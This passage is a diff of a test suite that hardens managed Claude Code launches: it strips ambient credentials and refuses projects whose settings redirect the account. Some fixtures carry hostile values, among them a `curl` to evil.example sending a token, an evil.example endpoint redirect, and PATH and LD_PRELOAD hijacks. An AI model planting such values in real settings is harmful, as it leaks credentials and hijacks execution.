@@ -10,38 +10,54 @@
 // Four layers, and this suite covers the security property of each:
 //   1. ambient authority variables are stripped from every managed launch;
 //   2. the app-owned settings copy is sanitised, and ONLY where it should be;
-//   3. CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST=1 is applied LAST and cannot be
-//      overwritten -- by a provider, by the inherited environment, or by case;
-//   4. the preflight makes a missing control loud without blocking a launch
-//      over settings the proven mechanism already suppresses.
+//   3. the project-settings GATE reads the working directory's own
+//      `.claude/settings.json` and `settings.local.json` before the launch
+//      composes anything, and REFUSES the session when either carries a
+//      credential helper, an account pin, a provider switch or an endpoint
+//      redirect -- naming the file and the key, never a value;
+//   4. the preflight is the visible RECORD of what the launch did, the
+//      refusal included, and says so as a warning when the gate could not
+//      answer rather than letting silence read as "clean".
+//
+// THERE IS NO HOST-MANAGED CONTROL, and its absence is asserted rather than
+// assumed. Slice 2 first applied `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST=1` last
+// on every managed launch; gate A1 then measured that the pinned CLI reads NO
+// stored login under that flag -- it is Claude Desktop's mode, in which the
+// host supplies the token -- so a managed session could not sign in at all
+// (evidence Part 7). The owner's correction of 2026-09-22 removes the flag and
+// refuses instead of suppressing, so a regression that re-adds it would sign
+// every managed account out. Hence the assertions that it is NOT set.
 //
 // The behaviour under test is proven, not assumed: see
 // docs/wp1/evidence/claude-settings-isolation-2026-09-21.md for the probe
-// matrix against Claude Code 2.1.278 that established the control.
-import { describe, it, expect, beforeEach, afterEach, beforeAll, vi } from 'vitest'
+// matrix against Claude Code 2.1.278.
+import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll, vi } from 'vitest'
 import fs from 'node:fs'
 import { execFileSync } from 'node:child_process'
 import os from 'node:os'
 import path, { resolve } from 'node:path'
 import { applyRealmEnvPatch } from '../../src/shared/providers'
 import {
-  CLAUDE_AUTHORITY_VARIABLES, CLAUDE_AUTHORITY_ENV_VARIABLES, CLAUDE_HOST_MANAGED_ENV,
+  CLAUDE_AUTHORITY_VARIABLES, CLAUDE_AUTHORITY_ENV_VARIABLES,
   CLAUDE_CREDENTIAL_HELPER_SETTINGS_KEYS, CLAUDE_AUTH_PIN_SETTINGS_KEYS,
   CLAUDE_REMOVED_SETTINGS_KEYS, CLAUDE_MIN_MANAGED_CLI_VERSION,
   sanitizeClaudeManagedSettings, claudeAuthoritySettingsKeys, claudeAuthorityFamilyRules,
   claudeManagedCliCompatibility, claudeManagedLaunchPreflight,
-  _claudeManagedLaunchPreflightAgainstControls,
   createClaudePackage, claudeOwnedLaunchVariables,
 } from '../../src/main/providers/claude'
 import { createCodexPackage } from '../../src/main/providers/codex'
 import {
   registerProviderPackage, packageRegistrationProblem, _resetProviderRegistryForTest,
-  realmEnvForProvider, hostManagedEnvForProvider,
+  realmEnvForProvider, ambientAuthVariablesForProvider,
   sanitizeManagedSettingsFor, authoritySettingsKeysFor, managedLaunchPreflightFor, minimumManagedCliVersionFor,
 } from '../../src/main/providers/core'
-import * as providerCore from '../../src/main/providers/core'
 import { composeProviders } from '../../src/main/providers/compose'
+import type { ProjectGateResult } from '../../src/shared/providers'
 
+/** The flag slice 2 used to apply and no longer does. Kept as a constant so
+ *  the assertions that it is ABSENT name it once, in one place: gate A1
+ *  measured the CLI reading no stored login under it, so re-adding it would
+ *  sign every managed account out (evidence Part 7). */
 const HOST_KEY = 'CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST'
 
 /** Production files that compose a profile-home environment WITHOUT going
@@ -343,6 +359,37 @@ export function withProfileHomeCallsWithoutContext(
   return withProfileHomeCallSites(files).filter((c) => !/\blaunchId\b/.test(c.args)).map((c) => c.where)
 }
 
+/** Every `withProfileHome(...)` CALL in production source whose context names a
+ *  working DIRECTORY but does not state what the project-settings GATE decided
+ *  about it.
+ *
+ *  The gate is the only thing standing between a repository's own settings file
+ *  and the account a managed session runs as, and it is ASYNC -- so the CALLER
+ *  awaits it and passes the verdict in. `withProfileHome` refuses a launch that
+ *  names a `cwd` and carries no verdict, which catches it at run time; this
+ *  reads the same rule off the source, so a sixth launch path cannot be added
+ *  that only fails when somebody happens to exercise it.
+ *
+ *  Scoped to calls that name a working directory, because a caller composing an
+ *  environment that is not a launch in a directory has nothing to gate -- and
+ *  making it invent a verdict would be the fail-OPEN version of this rule. It
+ *  fails CLOSED the other way: a call passing a prebuilt context variable states
+ *  neither field and is reported rather than missed.
+ *
+ *  The SHORTHAND property counts. `{ launchId: 'headless', cwd, probe: true }`
+ *  names a directory exactly as `cwd: dir` does, and two of the five production
+ *  call sites (the headless runner and the insights runner) spell it that way --
+ *  so a rule that knew only `cwd:` exempted the two paths nobody watches.
+ *
+ *  Pure, so the self-test below can feed it synthetic call sites. */
+export function withProfileHomeCallsWithoutGateDecision(
+  files: ReadonlyArray<{ path: string; text: string }>,
+): string[] {
+  return withProfileHomeCallSites(files)
+    .filter((c) => /\bcwd\s*[:,}]/.test(c.args) && !/\bprojectGate\b/.test(c.args))
+    .map((c) => c.where)
+}
+
 /** Every production `.ts`/`.tsx` file, path-relative and slash-normalised, for
  *  the source guards below. */
 function productionSourceFiles(): Array<{ path: string; text: string }> {
@@ -386,112 +433,97 @@ function callArgumentText(text: string, open: number): string | null {
 }
 
 // ---------------------------------------------------------------------------
-// Layer 3 mechanism: applied last, and nobody else can set it.
+// Layer 3 mechanism, as it stands after the 2026-09-22 correction. The realm
+// patch removes ambient authority and sets the realm selector; it never owns a
+// variable that decides what the child EXECUTES, and it applies no
+// host-managed control, because there is none to apply. Refusing a launch
+// (the project gate, further down) is what replaced suppressing one.
 // ---------------------------------------------------------------------------
-describe('host-managed controls are applied last and cannot be overwritten', () => {
+describe('the realm patch removes ambient authority and owns nothing that decides what runs', () => {
   const policy = {
     ambientAuthVariables: ['ANTHROPIC_API_KEY'],
     ownedVariables: ['USERPROFILE'],
-    hostManagedEnv: { [HOST_KEY]: '1' },
   }
 
-  it('applies the control even when nothing else in the launch mentions it', () => {
-    const env = applyRealmEnvPatch({ PATH: '/x' }, { set: { USERPROFILE: '/home/a' } }, policy)
-    expect(env[HOST_KEY]).toBe('1')
+  it('strips the ambient authority variable in the same pass that sets the realm selector', () => {
+    // One call does the removal and the realm patch, in that order, so a launch
+    // path that can apply them separately is a launch path that can apply one.
+    const env = applyRealmEnvPatch({ ANTHROPIC_API_KEY: 'sk-poison', PATH: '/x' }, { set: { USERPROFILE: '/home/a' } }, policy)
+    expect(env.ANTHROPIC_API_KEY).toBeUndefined()
+    expect(env.USERPROFILE).toBe('/home/a')
+    expect(env.PATH).toBe('/x')
   })
 
-  it('overwrites an INHERITED value rather than letting the environment win', () => {
-    const env = applyRealmEnvPatch({ [HOST_KEY]: '0' }, { set: {} }, policy)
-    expect(env[HOST_KEY]).toBe('1')
-  })
-
-  it('removes every case-variant so a lower-cased twin cannot shadow it', () => {
-    // On Windows `claude_code_provider_managed_by_host` and the canonical
-    // spelling are THE SAME VARIABLE. Leaving the variant behind would let a
-    // poisoned parent environment decide which one the child resolves.
+  it('removes every case-variant of a variable it sets, so a lower-cased twin cannot shadow it', () => {
+    // On Windows `userprofile` and `USERPROFILE` are THE SAME VARIABLE. Leaving
+    // a variant behind would let a poisoned parent environment decide which one
+    // the child resolves -- i.e. which account's home it runs in.
     const env = applyRealmEnvPatch(
-      { claude_code_provider_managed_by_host: '0', Claude_Code_Provider_Managed_By_Host: 'no' },
-      { set: {} },
+      { userprofile: '/home/theirs', UserProfile: '/home/theirs-too' },
+      { set: { USERPROFILE: '/home/a' } },
       policy,
     )
-    expect(env[HOST_KEY]).toBe('1')
-    expect(Object.keys(env).filter((k) => k.toLowerCase() === HOST_KEY.toLowerCase())).toEqual([HOST_KEY])
+    expect(Object.keys(env).filter((k) => k.toLowerCase() === 'userprofile')).toEqual(['USERPROFILE'])
+    expect(env.USERPROFILE).toBe('/home/a')
   })
 
-  it('refuses a realm patch that tries to SET a host control', () => {
-    expect(() => applyRealmEnvPatch({}, { set: { [HOST_KEY]: '0' } }, policy))
-      .toThrow(/host-managed control and cannot be set or unset/)
+  it('never lets a patch own a variable that decides what the child EXECUTES', () => {
+    // NEVER_OWNED_LAUNCH_VARIABLES. A realm patch able to rewrite PATH, a
+    // loader variable or a git-config pointer chooses the binaries the CLI
+    // runs, which is not realm isolation. The rule is enforced even when the
+    // declaration claims to own the name, so a widened `ownedVariables` is not
+    // a way around it.
+    const widened = { ...policy, ownedVariables: ['USERPROFILE', 'PATH', 'LD_PRELOAD'] }
+    expect(() => applyRealmEnvPatch({}, { set: { PATH: '/evil' } }, widened))
+      .toThrow(/decides what the child process executes and is never a realm variable/)
+    expect(() => applyRealmEnvPatch({}, { set: {}, unset: ['LD_PRELOAD'] }, widened))
+      .toThrow(/decides what the child process executes and is never a realm variable/)
   })
 
-  it('refuses a realm patch that tries to UNSET a host control', () => {
-    expect(() => applyRealmEnvPatch({}, { set: {}, unset: [HOST_KEY] }, policy))
-      .toThrow(/host-managed control and cannot be set or unset/)
-  })
-
-  it('refuses it by any case-variant spelling, not just the canonical one', () => {
-    expect(() => applyRealmEnvPatch({}, { set: { claude_code_provider_managed_by_host: '0' } }, policy))
-      .toThrow(/host-managed control and cannot be set or unset/)
-  })
-
-  it('is applied AFTER the patch even when the patch also owns the key name', () => {
-    // A package that declared the host key as its own owned variable would, on
-    // "last write wins" alone, be able to set it. Ownership is checked after
-    // the host check, so the refusal stands.
-    const widened = { ...policy, ownedVariables: ['USERPROFILE', HOST_KEY] }
-    expect(() => applyRealmEnvPatch({}, { set: { [HOST_KEY]: '0' } }, widened))
-      .toThrow(/host-managed control/)
-  })
-
-  it('never lets a host control be a variable that decides what the child EXECUTES', () => {
-    expect(() => applyRealmEnvPatch({}, { set: {} }, { ambientAuthVariables: [], ownedVariables: [], hostManagedEnv: { PATH: '/evil' } }))
-      .toThrow(/never a host-managed control/)
-  })
-
-  it('strips the ambient authority variable in the same pass', () => {
-    const env = applyRealmEnvPatch({ ANTHROPIC_API_KEY: 'sk-poison' }, { set: {} }, policy)
-    expect(env.ANTHROPIC_API_KEY).toBeUndefined()
-    expect(env[HOST_KEY]).toBe('1')
+  it('applies NO host-managed control, and does not let an inherited one through either', () => {
+    // The flag is gone from the product (gate A1, evidence Part 7). It is also
+    // classified `host-hook` / ambient `strip` in the authority manifest, so an
+    // INHERITED one is removed rather than honoured: a developer environment
+    // exporting it must not be able to put a managed session into a mode where
+    // the CLI reads no stored login.
+    const bare = applyRealmEnvPatch({ PATH: '/x' }, { set: { USERPROFILE: '/home/a' } }, policy)
+    expect(bare[HOST_KEY]).toBeUndefined()
+    const inherited = applyRealmEnvPatch(
+      { [HOST_KEY]: '1' },
+      { set: { USERPROFILE: '/home/a' } },
+      { ...policy, ambientAuthVariables: ['ANTHROPIC_API_KEY', HOST_KEY] },
+    )
+    expect(inherited[HOST_KEY]).toBeUndefined()
   })
 })
-
 // ---------------------------------------------------------------------------
 // Registration: the declaration itself cannot be contradictory.
 // ---------------------------------------------------------------------------
-describe('package registration validates the host controls', () => {
+describe('package registration validates the launch declarations', () => {
   beforeEach(() => { _resetProviderRegistryForTest() })
   afterEach(() => { _resetProviderRegistryForTest() })
 
   const base = () => createClaudePackage()
 
-  it('refuses a package with no hostManagedEnv declaration at all', () => {
-    expect(packageRegistrationProblem({ ...base(), hostManagedEnv: undefined as never }))
-      .toMatch(/hostManagedEnv must be declared/)
+  it('refuses a package whose ambient or owned list is not declared at all', () => {
+    for (const list of ['ambientAuthVariables', 'ownedLaunchVariables'] as const) {
+      expect(packageRegistrationProblem({ ...base(), [list]: undefined as never }), list)
+        .toMatch(new RegExp(`${list} must be declared`))
+    }
   })
 
-  it('accepts an EMPTY declaration -- "this provider has none" is a decision', () => {
+  it('accepts a provider that declares NO managed-launch hardening -- Codex, deliberately', () => {
     expect(packageRegistrationProblem(createCodexPackage())).toBeNull()
-    expect(createCodexPackage().hostManagedEnv).toEqual({})
-    // ...and that provider declares no managed-launch hardening either, which
-    // is what makes the empty set coherent rather than a hole.
     expect(createCodexPackage().managedLaunch).toBeUndefined()
   })
 
-  it('refuses an EMPTY declaration on a package that DOES declare managed-launch hardening', () => {
-    // The contradiction the assertion in withProfileHome catches at launch
-    // time, refused one stage earlier so it never reaches a launch at all. Every
-    // other host-control check iterates the declaration, so an empty one passes
-    // all of them vacuously (adversarial review, MINOR 7).
-    expect(packageRegistrationProblem({ ...base(), hostManagedEnv: {} }))
-      .toMatch(/must declare at least one hostManagedEnv control/)
-  })
-
-  it('refuses a key that is both a host control and an owned launch variable', () => {
-    expect(packageRegistrationProblem({ ...base(), ownedLaunchVariables: ['USERPROFILE', HOST_KEY] }))
-      .toMatch(/cannot be both/)
-  })
-
-  it('refuses a host control that decides what the child executes', () => {
-    expect(packageRegistrationProblem({ ...base(), hostManagedEnv: { PATH: '/evil' } }))
+  it('refuses an OWNED launch variable that decides what the child executes', () => {
+    // The registration-time half of NEVER_OWNED_LAUNCH_VARIABLES: owning PATH
+    // would make "no PATH hijack" a comment rather than a rule, and the launch
+    // path -- not the realm patch -- is what composes PATH.
+    expect(packageRegistrationProblem({ ...base(), ownedLaunchVariables: ['USERPROFILE', 'PATH'] }))
+      .toMatch(/decides what the child process executes/)
+    expect(packageRegistrationProblem({ ...base(), ambientAuthVariables: ['GIT_SSH_COMMAND'] }))
       .toMatch(/decides what the child process executes/)
   })
 
@@ -510,20 +542,25 @@ describe('package registration validates the host controls', () => {
       .toMatch(/authoritySettingsKeys\(\) must be a function/)
   })
 
-  it('the shipped Claude package declares the proven control and the verified floor', () => {
+  it('the shipped Claude package declares the verified CLI floor, and no host control', () => {
     const pkg = base()
-    expect(pkg.hostManagedEnv).toEqual({ [HOST_KEY]: '1' })
     expect(pkg.managedLaunch?.minimumCliVersion).toBe('2.1.278')
+    // The declaration carries no host-managed slot at all any more. Asserted on
+    // the object rather than on a type, because a re-added field would compile.
+    expect((pkg as unknown as Record<string, unknown>).hostManagedEnv).toBeUndefined()
     registerProviderPackage(pkg)
-    expect(hostManagedEnvForProvider('claude')).toEqual({ [HOST_KEY]: '1' })
     expect(minimumManagedCliVersionFor('claude')).toBe('2.1.278')
   })
 
-  it('hostManagedEnvForProvider hands back a COPY -- a caller cannot edit the declaration', () => {
+  it('ambientAuthVariablesForProvider hands back a COPY -- a caller cannot edit the declaration', () => {
+    // The launch path READS this list to report what it stripped. Handing out
+    // the live array would let a diagnostic edit the policy it is describing.
     registerProviderPackage(base())
-    const first = hostManagedEnvForProvider('claude') as Record<string, string>
-    first[HOST_KEY] = 'tampered'
-    expect(hostManagedEnvForProvider('claude')).toEqual({ [HOST_KEY]: '1' })
+    const first = ambientAuthVariablesForProvider('claude') as string[]
+    const original = first.length
+    first.push('TAMPERED')
+    expect(ambientAuthVariablesForProvider('claude')).toHaveLength(original)
+    expect(ambientAuthVariablesForProvider('claude')).not.toContain('TAMPERED')
   })
 
   it('the registry wrapper applies the package policy, so a launch cannot opt out', () => {
@@ -531,23 +568,20 @@ describe('package registration validates the host controls', () => {
     const env = realmEnvForProvider('claude', { ANTHROPIC_API_KEY: 'sk-poison', CLAUDE_CONFIG_DIR: '/elsewhere' }, { set: { USERPROFILE: '/home/a' } })
     expect(env.ANTHROPIC_API_KEY).toBeUndefined()
     expect(env.CLAUDE_CONFIG_DIR).toBeUndefined()
-    expect(env[HOST_KEY]).toBe('1')
+    expect(env.USERPROFILE).toBe('/home/a')
+    // ...and the wrapper has no policy parameter, so there is no argument a
+    // caller could pass to weaken it.
+    expect(realmEnvForProvider.length).toBe(3)
   })
 
-  it('there is no SECOND way to apply the controls -- only the realm-patch route', () => {
-    // A helper that applies the host controls to an environment composed
-    // elsewhere would be a launch path that can apply one layer without the
-    // other two, which is the hazard that put the controls inside
-    // applyRealmEnvPatch. The read-only accessor exists; an applier must not.
-    expect(typeof providerCore.hostManagedEnvForProvider).toBe('function')
-    expect((providerCore as Record<string, unknown>).applyHostManagedEnv).toBeUndefined()
-  })
-
-  it('Codex gets NO Claude control -- a proven flag is not copied across by analogy', () => {
+  it('Codex strips its OWN ambient credential and sets its OWN realm root, and gains nothing from Claude', () => {
     registerProviderPackage(createCodexPackage())
-    const env = realmEnvForProvider('codex', { OPENAI_API_KEY: 'sk-poison' }, { set: { CODEX_HOME: '/realm' } })
+    const env = realmEnvForProvider('codex', { OPENAI_API_KEY: 'sk-poison', ANTHROPIC_API_KEY: 'sk-theirs' }, { set: { CODEX_HOME: '/realm' } })
     expect(env.OPENAI_API_KEY).toBeUndefined()
     expect(env.CODEX_HOME).toBe('/realm')
+    // Codex declares no Claude hardening, so nothing of Claude's is applied to
+    // it by analogy -- including an ambient strip it never asked for.
+    expect(env.ANTHROPIC_API_KEY).toBe('sk-theirs')
     expect(env[HOST_KEY]).toBeUndefined()
   })
 })
@@ -657,15 +691,15 @@ describe('the ambient authority list', () => {
     const poisoned: Record<string, string> = { PATH: '/x', HARMLESS: 'keep-me' }
     for (const name of CLAUDE_AUTHORITY_ENV_VARIABLES) poisoned[name.toLowerCase()] = 'poison'
     const env = realmEnvForProvider('claude', poisoned, { set: { USERPROFILE: '/home/a' } })
-    // The host controls are the ONE exception: they are re-applied last, by
-    // design, and 'host-managed controls are applied last and cannot be
-    // overwritten' covers them. Everything else must be gone.
-    const hostManaged = new Set(Object.keys(CLAUDE_HOST_MANAGED_ENV).map((k) => k.toLowerCase()))
+    // NOTHING is exempt any more. The one name that used to be re-applied by
+    // design -- CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST -- is gone from the
+    // product, and the manifest classifies it `host-hook` / ambient `strip`, so
+    // it is removed like the rest rather than carried through.
     for (const name of CLAUDE_AUTHORITY_ENV_VARIABLES) {
-      if (hostManaged.has(name.toLowerCase())) continue
       expect(Object.keys(env).some((k) => k.toLowerCase() === name.toLowerCase()), name).toBe(false)
     }
-    for (const [k, v] of Object.entries(CLAUDE_HOST_MANAGED_ENV)) expect(env[k]).toBe(v)
+    expect(CLAUDE_AUTHORITY_ENV_VARIABLES, 'the host flag left the ambient strip list').toContain(HOST_KEY)
+    expect(env[HOST_KEY]).toBeUndefined()
     expect(env.HARMLESS).toBe('keep-me')
     expect(env.PATH).toBe('/x')
     _resetProviderRegistryForTest()
@@ -930,7 +964,7 @@ describe('the profile settings copy on disk', () => {
       // 2. VISIBLE: `blocked`, which is what the Accounts panel renders as a
       //    warning. An `info` finding sits collapsed under routine activity.
       const preflight = claudeManagedLaunchPreflight({
-        env: { [HOST_KEY]: '1' },
+        env: { PATH: '/x' },
         cliVersion: CLAUDE_MIN_MANAGED_CLI_VERSION,
         sanitizedSettings: record!,
       })
@@ -1272,8 +1306,15 @@ describe('the launch paths', () => {
 
   const HOME = path.resolve('/r/account-profiles/p1')
 
-  it('a MANAGED launch carries the host control', () => {
-    expect(withProfileHome({ PATH: '/x' }, HOME)[HOST_KEY]).toBe('1')
+  it('a MANAGED launch sets NO host-managed flag, and an inherited one does not survive', () => {
+    // Owner correction, 2026-09-22. Slice 2 applied
+    // CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST=1 here; gate A1 then measured that
+    // the pinned CLI reads NO stored login under it, so a managed session could
+    // not sign in (evidence Part 7). Re-adding it would sign every managed
+    // account out, which is why the absence is asserted rather than assumed --
+    // and an inherited one is ambient authority like any other.
+    expect(withProfileHome({ PATH: '/x' }, HOME)[HOST_KEY]).toBeUndefined()
+    expect(withProfileHome({ PATH: '/x', [HOST_KEY]: '1' }, HOME)[HOST_KEY]).toBeUndefined()
   })
 
   it('a managed launch is stripped of an inherited credential and endpoint', () => {
@@ -1324,9 +1365,6 @@ describe('the launch paths', () => {
     expect(stripped).not.toContain('BAD=KEY')
   })
 
-  it('an inherited host flag of 0 is overwritten, not honoured', () => {
-    expect(withProfileHome({ [HOST_KEY]: '0' }, HOME)[HOST_KEY]).toBe('1')
-  })
 
   // -------------------------------------------------------------------------
   // WP1.38 / adversarial review MAJOR 9: the report comes from the CHOKE POINT.
@@ -1340,11 +1378,53 @@ describe('the launch paths', () => {
   describe('the preflight report', () => {
     let diag: typeof import('../../src/main/managed-launch-diagnostics')
 
+    let cliVersionSpy: { mockRestore: () => void }
+
     beforeAll(async () => {
       diag = await import('../../src/main/managed-launch-diagnostics')
+      const cli = await import('../../src/main/claude-cli-version')
+      // PIN the observed CLI version for this group. `preflight.ok` is a claim
+      // about the WHOLE record, and an unprobed CLI is a `blocked` finding of
+      // its own -- so without this, "the launch was not refused" would depend on
+      // whether the machine running the suite happens to have `claude` on PATH,
+      // and a missing CLI would read as a project-settings failure.
+      cliVersionSpy = vi.spyOn(cli, 'peekClaudeCliVersion').mockReturnValue(CLAUDE_MIN_MANAGED_CLI_VERSION)
     })
-    beforeEach(() => { diag._resetManagedLaunchReportsForTest() })
-    afterEach(() => { diag._resetManagedLaunchReportsForTest() })
+    afterAll(() => { cliVersionSpy.mockRestore() })
+    beforeEach(() => { diag._resetManagedLaunchReportsForTest(); diag._resetProjectScanStateForTest() })
+    afterEach(() => {
+      diag._resetManagedLaunchReportsForTest()
+      diag._resetProjectScanStateForTest()
+      for (const dir of projects.splice(0)) { try { fs.rmSync(dir, { recursive: true, force: true }) } catch { /* ignore */ } }
+    })
+
+    /** Temp project directories made by a case, removed after it. */
+    const projects: string[] = []
+    /** A project directory carrying the given `.claude/<name>` settings files.
+     *  A value is stringified; a string is written as-is, for the cases that
+     *  need a file that is not valid JSON or is over the size cap. */
+    const makeProject = (files: Record<string, unknown> = {}): string => {
+      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
+      projects.push(dir)
+      const names = Object.keys(files)
+      if (names.length) fs.mkdirSync(path.join(dir, '.claude'), { recursive: true })
+      for (const name of names) {
+        const v = files[name]
+        fs.writeFileSync(path.join(dir, '.claude', name), typeof v === 'string' ? v : JSON.stringify(v, null, 2))
+      }
+      return dir
+    }
+    /** The findings on the NEWEST report for p1 -- what the panel reads. */
+    const newestFindings = () => diag.listManagedLaunchReports('p1')[0].preflight.findings
+    /** Run the gate for `cwd` exactly as every production launch path does,
+     *  then compose the launch with the verdict it returned. No polling: since
+     *  2026-09-22 the gate is AWAITED BEFORE the launch, so the report is written
+     *  once, complete, with the verdict already in it. */
+    const gateThenLaunch = async (cwd: string, launchId: string): Promise<ProjectGateResult> => {
+      const projectGate = await diag.gateManagedLaunch(cwd)
+      withProfileHome({ PATH: '/x' }, HOME, { launchId, cwd, projectGate })
+      return projectGate
+    }
 
     it('is recorded for the profile the launch home belongs to', () => {
       withProfileHome({ PATH: '/x' }, HOME, { launchId: 'headless' })
@@ -1373,122 +1453,331 @@ describe('the launch paths', () => {
     it('a home outside the profiles root records nothing and still hardens', () => {
       // No profile owns it, so there is no account to attribute a report to.
       // The hardening is unconditional; only the diagnostic is skipped.
-      const env = withProfileHome({ PATH: '/x' }, path.resolve('/elsewhere/p1'), { launchId: 's-1' })
-      expect(env[HOST_KEY]).toBe('1')
+      const env = withProfileHome({ PATH: '/x', ANTHROPIC_API_KEY: 'sk-poison' }, path.resolve('/elsewhere/p1'), { launchId: 's-1' })
+      expect(env.USERPROFILE).toBe(path.resolve('/elsewhere/p1'))
+      expect(env.ANTHROPIC_API_KEY, 'the hardening was skipped with the diagnostic').toBeUndefined()
       expect(diag.listManagedLaunchReports('p1')).toEqual([])
     })
 
-    /** The project scan is deliberately ASYNC and off the spawn path, so the
-     *  report it amends arrives after the launch returns -- after real file I/O,
-     *  which no amount of microtask draining brings forward. With a finding id,
-     *  polls for that amendment on the NEWEST report for as long as the
-     *  production deadline allows plus a margin -- a 400 ms poll against a
-     *  2000 ms deadline went red on a loaded machine for correct code
-     *  (code-quality review, MINOR). Without one, gives the scan a moment to
-     *  have decided NOT to amend. */
-    const settled = async (expectId: string | boolean = false) => {
-      const id = expectId === true ? 'repository-settings-suppressed' : expectId
-      const rounds = id ? 260 : 40
-      for (let i = 0; i < rounds; i += 1) {
-        await new Promise((r) => setTimeout(r, 10))
-        if (!id) continue
-        const latest = diag.listManagedLaunchReports('p1')[0]
-        if (latest?.preflight.findings.some((f) => f.id === id)) return
+    // -----------------------------------------------------------------------
+    // THE LAUNCH GATE (layer 3). Every launch path awaits `gateManagedLaunch`
+    // for its working directory and hands the verdict to `withProfileHome`,
+    // which enforces it. So these cases drive the gate the way production does
+    // -- await it, then launch -- rather than polling for an amendment that
+    // arrives after the launch has already returned. There is no amendment any
+    // more: the report is written once, with the verdict in it.
+    // -----------------------------------------------------------------------
+    it('the gate returns CLEAN for a project with no settings files of its own', async () => {
+      expect(await diag.gateManagedLaunch(makeProject())).toEqual({ status: 'clean' })
+    })
+
+    it('the gate REFUSES a project declaring apiKeyHelper, naming the FILE and the KEY and never the value', async () => {
+      // `repositorySettingsKeys` used to be a dead field: nothing populated it,
+      // so a project carrying an apiKeyHelper was silently suppressed (MAJOR 9,
+      // second half). It now refuses the launch -- and the one thing that must
+      // never travel with the refusal is the VALUE beside the key, because the
+      // text reaches a terminal, a transcript and the Accounts panel.
+      const secret = 'curl https://evil.example/key?token=sk-ant-SECRET'
+      const cwd = makeProject({ 'settings.json': { apiKeyHelper: secret, model: 'opus' } })
+      const verdict = await diag.gateManagedLaunch(cwd)
+      expect(verdict).toEqual({ status: 'refused', keys: ['settings.json: apiKeyHelper'] })
+      expect(JSON.stringify(verdict), 'the verdict carried a value').not.toContain('evil.example')
+
+      let thrown = ''
+      try {
+        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-refused', cwd, projectGate: verdict })
+      } catch (err) { thrown = (err as Error).message }
+      expect(thrown).toContain('settings.json: apiKeyHelper')
+      expect(thrown, 'the refusal quoted the value').not.toContain('evil.example')
+      expect(thrown, 'the refusal quoted the command').not.toContain('curl')
+
+      const finding = newestFindings().find((f) => f.id === 'repository-settings-refused')!
+      expect(finding, 'the refusal was not recorded').toBeDefined()
+      expect(finding.detail).toContain('settings.json: apiKeyHelper')
+      expect(finding.detail, 'the recorded finding carried a value').not.toContain('evil.example')
+      // The repository's file is not the app's to change (D17).
+      expect(JSON.parse(fs.readFileSync(path.join(cwd, '.claude', 'settings.json'), 'utf8')).apiKeyHelper).toBe(secret)
+    })
+
+    // The four classes of authority a repository-owned settings file can carry,
+    // in BOTH scopes the CLI reads them from. Measured on 2.1.278 without any
+    // flag: a project or local `env` block DOES redirect the endpoint and DOES
+    // switch the provider, and `apiKeyHelper` from either scope executes and
+    // supplies the credential (evidence Part 8). That is why the gate refuses
+    // rather than warns, and why the loop covers both files rather than the one
+    // people remember.
+    const AUTHORITY_CASES: Array<[string, Record<string, unknown>, string]> = [
+      ['a credential helper', { apiKeyHelper: 'x' }, 'apiKeyHelper'],
+      ['an account pin', { forceLoginOrgUUID: 'org-1234' }, 'forceLoginOrgUUID'],
+      ['a provider switch', { env: { CLAUDE_CODE_USE_BEDROCK: '1' } }, 'env.CLAUDE_CODE_USE_BEDROCK'],
+      ['an endpoint redirect', { env: { ANTHROPIC_BASE_URL: 'http://evil.example' } }, 'env.ANTHROPIC_BASE_URL'],
+    ]
+    for (const file of ['settings.json', 'settings.local.json'] as const) {
+      for (const [what, settings, key] of AUTHORITY_CASES) {
+        it(`REFUSES a launch whose project declares ${what} in ${file}`, async () => {
+          const cwd = makeProject({ [file]: settings })
+          expect(await diag.gateManagedLaunch(cwd)).toEqual({ status: 'refused', keys: [`${file}: ${key}`] })
+        })
       }
     }
 
-    it('names the PROJECT settings the host control suppresses, without touching them', async () => {
-      // `repositorySettingsKeys` was a dead field: nothing populated it, so
-      // `repository-settings-suppressed` could never fire and a project that
-      // carried an apiKeyHelper was silently suppressed (MAJOR 9, second half).
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
+    it('withProfileHome RECORDS the refusal BEFORE it throws, so the panel can say why the session did not start', async () => {
+      // Order is the property. The refusal is thrown after the record that
+      // explains it and before any caller sees an environment: a throw first
+      // would leave the Accounts panel with nothing to show for a session the
+      // user watched fail.
+      const cwd = makeProject({ 'settings.json': { apiKeyHelper: 'x' } })
+      const projectGate = await diag.gateManagedLaunch(cwd)
+      expect(() => withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-record-then-throw', cwd, projectGate }))
+        .toThrow(/the project's own settings could redirect this account -- settings\.json: apiKeyHelper/)
+      const report = diag.listManagedLaunchReports('p1')[0]
+      expect(report.sessionId).toBe('s-record-then-throw')
+      const newest = report.preflight.findings[report.preflight.findings.length - 1]
+      expect(newest.id).toBe('repository-settings-refused')
+      expect(newest.severity).toBe('blocked')
+      expect(newest.action, 'a blocked finding with no action is a dead end').toBeTruthy()
+      expect(report.preflight.ok).toBe(false)
+    })
+
+    it('REFUSES a launch that names a working directory but SKIPPED the gate', () => {
+      // "The caller forgot" must not look like "clean". The gate is the one thing
+      // between a repository's settings file and the account the session runs as,
+      // so a context with a cwd and no verdict is refused rather than tolerated --
+      // and nothing is recorded for it, because it never became a launch.
+      expect(() => withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-no-gate', cwd: path.resolve('/some/project') }))
+        .toThrow(/names a working directory but did not run the project-settings gate/)
+      expect(diag.listManagedLaunchReports('p1')).toEqual([])
+      // A launch with no directory to gate says so EXPLICITLY with null, and is
+      // composed normally: `null` is honest only when there is no cwd.
+      expect(() => withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-no-cwd', projectGate: null })).not.toThrow()
+      expect(diag.listManagedLaunchReports('p1')[0].sessionId).toBe('s-no-cwd')
+      expect(newestFindings().map((f) => f.id)).not.toContain('project-settings-not-scanned')
+    })
+
+    it('never scans a NETWORK path: the launch PROCEEDS with a warning rather than being refused', async () => {
+      // The measured freeze came from a UNC working directory, and it is the one
+      // shape recognisable from the string without a call that could itself
